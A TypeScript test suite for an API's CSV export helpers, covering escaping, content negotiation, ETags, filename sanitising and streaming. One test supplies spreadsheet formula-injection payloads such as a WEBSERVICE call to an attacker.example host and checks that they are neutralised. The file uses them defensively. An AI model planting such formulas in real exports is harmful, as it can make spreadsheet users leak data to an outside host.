import assert from "node:assert/strict";
import { test } from "vitest";
import {
  csvBodyStream,
  csvRequested,
  csvResponse,
  rowsToCsv,
} from "../workers/csv.ts";

function url(search = "") {
  return new URL(`https://api.metagraph.sh/api/v1/subnets${search}`);
}

function req(headers = {}, method = "GET") {
  return new Request("https://api.metagraph.sh/api/v1/subnets", {
    method,
    headers,
  });
}

async function drainCsvStream(stream: ReadableStream) {
  const reader = stream.getReader();
  const decoder = new TextDecoder();
  let text = "";
  for (;;) {
    const chunk = await reader.read();
    if (chunk.done) break;
    text += decoder.decode(chunk.value, { stream: true });
  }
  text += decoder.decode();
  return text;
}

test("rowsToCsv returns an empty body for empty rows without explicit columns", () => {
  assert.equal(rowsToCsv([], undefined), "");
});

test("rowsToCsv emits explicit columns for empty rows", () => {
  assert.equal(rowsToCsv([], ["netuid", "name"]), "netuid,name");
});

test("rowsToCsv accepts explicit columns with a non-array row input", () => {
  assert.equal(rowsToCsv(null as unknown as unknown[], ["netuid"]), "netuid");
});

test("rowsToCsv skips malformed rows when deriving columns", () => {
  assert.equal(
    rowsToCsv([null, ["bad"], { netuid: 7 }], undefined),
    "netuid\r\n\r\n\r\n7",
  );
});

test("rowsToCsv uses first-seen union column order and escapes RFC 4180 cells", () => {
  const csv = rowsToCsv(
    [
      { a: "plain", b: "comma,value", c: 'quote "value"' },
      { b: "line\nfeed", d: "carriage\rreturn" },
    ],
    undefined,
  );

  assert.equal(
    csv,
    'a,b,c,d\r\nplain,"comma,value","quote ""value""",\r\n,"line\nfeed",,"carriage\rreturn"',
  );
});

test("rowsToCsv serializes nulls, arrays, and objects predictably", () => {
  const csv = rowsToCsv(
    [
      {
        missing: null,
        tags: ["inference", "validators", { nested: true }],
        metadata: { ok: true, count: 2 },
        empty: undefined,
      },
    ],
    undefined,
  );

  assert.equal(
    csv,
    'missing,tags,metadata,empty\r\n,"inference;validators;{""nested"":true}","{""ok"":true,""count"":2}",',
  );
});

test("rowsToCsv neutralizes spreadsheet formula-leading cells", () => {
  const csv = rowsToCsv(
    [
      {
        eq: '=WEBSERVICE("https://attacker.example")',
        plus: '+HYPERLINK("https://attacker.example")',
        minus: "-2+3",
        at: "@SUM(1,1)",
        tab: "\t=1+1",
        tags: ["=evil", "safe"],
      },
    ],
    undefined,
  );

  const expected = `eq,plus,minus,at,tab,tags\r\n"'=WEBSERVICE(""https://attacker.example"")","'+HYPERLINK(""https://attacker.example"")",'-2+3,"'@SUM(1,1)",'\t=1+1,'=evil;safe`;
  assert.equal(csv, expected);
});

test("csvRequested honors format and Accept negotiation", () => {
  assert.equal(csvRequested(url("?format=csv"), req()), true);
  assert.equal(
    csvRequested(url(), req({ accept: "application/json, text/csv" })),
    true,
  );
  assert.equal(
    csvRequested(url("?format=json"), req({ accept: "text/csv" })),
    false,
  );
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=0" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=bogus" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=-0.1" })), false);
  assert.equal(csvRequested(url(), req({ accept: "text/csv;q=1.1" })), false);
  assert.equal(
    csvRequested(url(), req({ accept: "application/json, text/csv;q=0.25" })),
    false,
  );
  assert.equal(
    csvRequested(
      url(),
      req({ accept: "application/json;q=0.5, text/csv;q=0.75" }),
    ),
    true,
  );
  assert.equal(
    csvRequested(url(), req({ accept: "text/csv, application/json" })),
    true,
  );
  assert.equal(csvRequested(url(), req({ accept: "application/json" })), false);
  assert.equal(csvRequested(url(), req()), false);
});

test("csvResponse emits CSV download headers and a conditional ETag", async () => {
  const first = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
  );
  assert.equal(first.status, 200);
  assert.match(first.headers.get("content-type")!, /^text\/csv/);
  assert.equal(
    first.headers.get("content-disposition"),
    'attachment; filename="subnets.csv"',
  );
  assert.ok(first.headers.get("etag"));
  assert.equal(await first.text(), "netuid,name\r\n7,Allways");

  const matched = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
    req({ "if-none-match": first.headers.get("etag") }),
  );
  assert.equal(matched.status, 304);
  assert.equal(await matched.text(), "");
});

test("csvResponse sanitizes download filenames", async () => {
  const withExtension = await csvResponse([], "subnets.csv", "standard");
  assert.equal(
    withExtension.headers.get("content-disposition"),
    'attachment; filename="subnets.csv"',
  );

  const withSpaces = await csvResponse([], "unsafe report", "standard");
  assert.equal(
    withSpaces.headers.get("content-disposition"),
    'attachment; filename="unsafe-report.csv"',
  );

  const emptyStem = await csvResponse([], "///", "standard");
  assert.equal(
    emptyStem.headers.get("content-disposition"),
    'attachment; filename="export.csv"',
  );

  const missingName = await csvResponse([], "", "standard");
  assert.equal(
    missingName.headers.get("content-disposition"),
    'attachment; filename="export.csv"',
  );
});

test("csvResponse suppresses the body on HEAD", async () => {
  const response = await csvResponse(
    [{ netuid: 7, name: "Allways" }],
    "subnets",
    "standard",
    req({}, "HEAD"),
  );
  assert.equal(response.status, 200);
  assert.equal(await response.text(), "");
});

test("csvBodyStream emits the header before row chunks", async () => {
  const stream = csvBodyStream(
    [
      { netuid: 7, name: "Allways" },
      { netuid: 8, name: "Templar" },
    ],
    ["netuid", "name"],
  );
  const reader = stream.getReader();
  const decoder = new TextDecoder();

  const first = await reader.read();
  assert.equal(decoder.decode(first.value), "netuid,name\r\n");

  const second = await reader.read();
  assert.equal(decoder.decode(second.value), "7,Allways\r\n8,Templar");

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvBodyStream closes immediately when no header can be derived", async () => {
  const stream = csvBodyStream([], undefined);
  const done = await stream.getReader().read();
  assert.equal(done.done, true);
  assert.equal(done.value, undefined);
});

test("csvBodyStream emits a header-only export for explicit empty columns", async () => {
  const stream = csvBodyStream([], ["netuid", "name"]);
  const reader = stream.getReader();
  const decoder = new TextDecoder();

  const first = await reader.read();
  assert.equal(decoder.decode(first.value), "netuid,name");

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvBodyStream tolerates non-array rows when explicit columns are provided", async () => {
  const stream = csvBodyStream(null as unknown as unknown[], ["netuid"]);
  const reader = stream.getReader();
  const decoder = new TextDecoder();

  const first = await reader.read();
  assert.equal(decoder.decode(first.value), "netuid");

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvBodyStream serializes malformed row entries as empty cells", async () => {
  const stream = csvBodyStream([null], ["netuid"]);
  const reader = stream.getReader();
  const decoder = new TextDecoder();

  const first = await reader.read();
  assert.equal(decoder.decode(first.value), "netuid\r\n");

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvBodyStream emits continuation newlines when a large export spans multiple chunks", async () => {
  const rows = Array.from({ length: 129 }, (_, index) => ({ netuid: index }));
  const stream = csvBodyStream(rows, ["netuid"]);
  const reader = stream.getReader();
  const decoder = new TextDecoder();

  const header = await reader.read();
  assert.equal(decoder.decode(header.value), "netuid\r\n");

  const firstChunk = await reader.read();
  const firstChunkText = decoder.decode(firstChunk.value);
  assert.equal(firstChunkText.startsWith("0\r\n1\r\n2"), true);
  assert.equal(firstChunkText.endsWith("\r\n"), true);

  const secondChunk = await reader.read();
  assert.equal(decoder.decode(secondChunk.value), "128");

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvBodyStream matches rowsToCsv for small and multi-chunk exports", async () => {
  const smallRows = [
    { netuid: 7, name: "Allways" },
    { netuid: 8, name: "Templar" },
  ];
  assert.equal(
    await drainCsvStream(csvBodyStream(smallRows, ["netuid", "name"])),
    rowsToCsv(smallRows, ["netuid", "name"]),
  );

  const largeRows = Array.from({ length: 129 }, (_, index) => ({
    netuid: index,
    status: index % 2 === 0 ? "ok" : "degraded",
  }));
  assert.equal(
    await drainCsvStream(csvBodyStream(largeRows, ["netuid", "status"])),
    rowsToCsv(largeRows, ["netuid", "status"]),
  );
});

test("csvResponse can stream endpoint-sized exports without eager ETags", async () => {
  const response = await csvResponse(
    [
      { netuid: 7, provider: "allways", status: "ok" },
      { netuid: 8, provider: "templar", status: "degraded" },
    ],
    "endpoints",
    "short",
    null,
    ["netuid", "provider", "status"],
    {},
    { stream: true },
  );
  assert.equal(response.status, 200);
  assert.match(response.headers.get("content-type")!, /^text\/csv/);
  assert.equal(response.headers.get("etag"), null);

  const reader = response.body!.getReader();
  const decoder = new TextDecoder();
  const first = await reader.read();
  assert.equal(decoder.decode(first.value), "netuid,provider,status\r\n");
  const second = await reader.read();
  assert.equal(
    decoder.decode(second.value),
    "7,allways,ok\r\n8,templar,degraded",
  );

  const done = await reader.read();
  assert.equal(done.done, true);
});

test("csvResponse falls back to the buffered ETag path on HEAD even when streaming is requested", async () => {
  const response = await csvResponse(
    [{ netuid: 7, provider: "allways", status: "ok" }],
    "endpoints",
    "short",
    req({}, "HEAD"),
    ["netuid", "provider", "status"],
    {},
    { stream: true },
  );
  assert.equal(response.status, 200);
  assert.ok(response.headers.get("etag"));
  assert.equal(await response.text(), "");
});

test("csvResponse keeps conditional requests on the buffered ETag path when streaming is requested", async () => {
  const first = await csvResponse(
    [{ netuid: 7, provider: "allways", status: "ok" }],
    "endpoints",
    "short",
    req(),
    ["netuid", "provider", "status"],
  );
  const etag = first.headers.get("etag");
  assert.ok(etag);

  const matched = await csvResponse(
    [{ netuid: 7, provider: "allways", status: "ok" }],
    "endpoints",
    "short",
    req({ "if-none-match": etag }),
    ["netuid", "provider", "status"],
    {},
    { stream: true },
  );
  assert.equal(matched.status, 304);
  assert.equal(await matched.text(), "");
});

test("csvResponse returns a buffered 200 with an ETag for stale conditional requests when streaming is requested", async () => {
  const response = await csvResponse(
    [{ netuid: 7, provider: "allways", status: "ok" }],
    "endpoints",
    "short",
    req({ "if-none-match": 'W/"not-a-match"' }),
    ["netuid", "provider", "status"],
    {},
    { stream: true },
  );
  assert.equal(response.status, 200);
  assert.ok(response.headers.get("etag"));
  assert.equal(await response.text(), "netuid,provider,status\r\n7,allways,ok");
});
